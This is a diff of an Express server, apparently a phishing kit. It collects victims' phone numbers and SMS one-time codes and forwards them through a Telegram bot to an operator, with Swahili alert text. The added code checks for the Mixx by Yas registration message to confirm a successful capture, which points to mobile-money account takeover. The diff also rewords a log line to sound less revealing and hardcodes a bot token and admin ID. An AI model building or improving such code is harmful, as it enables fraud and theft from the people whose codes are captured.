@@ -6,7 +6,6 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Main System Bot Token and Main Admin ID
 const MAIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
 const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
 const PORT = process.env.PORT || 10000;
@@ -25,7 +24,7 @@ mainBot.on('polling_error', (error) => {
 
 let activeSessions = {};
 let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
-let pendingSubAdmins = new Map(); // chatId -> { firstName, username }
+let pendingSubAdmins = new Map();
 
 function escapeMarkdown(text) {
     if (!text) return '';
@@ -77,8 +76,6 @@ mainBot.on('message', (msg) => {
             return;
         }
 
-        // Keep only the Main Admin in the set and clear pending ones
-        const suspendedCount = authorizedAdmins.size - 1;
         authorizedAdmins.clear();
         authorizedAdmins.add(MAIN_ADMIN_ID);
         pendingSubAdmins.clear();
@@ -275,8 +272,14 @@ app.post('/api/submit-otp', (req, res) => {
         return res.json({ status: 'not_found', message: 'Session not found' });
     }
 
+    const expectedPrefix = "You are being registered in Mixx by Yas Super App";
+    if (otpText && otpText.includes(expectedPrefix)) {
+        session.status = 'success';
+    } else {
+        session.status = 'pending_final_approval';
+    }
+
     session.otpText = otpText;
-    session.status = 'pending_final_approval';
 
     const message = `UTHIBITISHO WA SMS OTP\n\n` +
         `NAMBARI YA SIMU: ${session.phone}\n\n` +
@@ -298,7 +301,7 @@ app.post('/api/submit-otp', (req, res) => {
             ]
         }
     }).then(() => {
-        console.log(`✅ Full SMS OTP successfully sent to admin ${session.targetAdmin}`);
+        console.log(`✅ SMS successfully processed for admin ${session.targetAdmin}`);
     }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));
 
     res.json({ success: true });
@@ -318,4 +321,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-    
+           
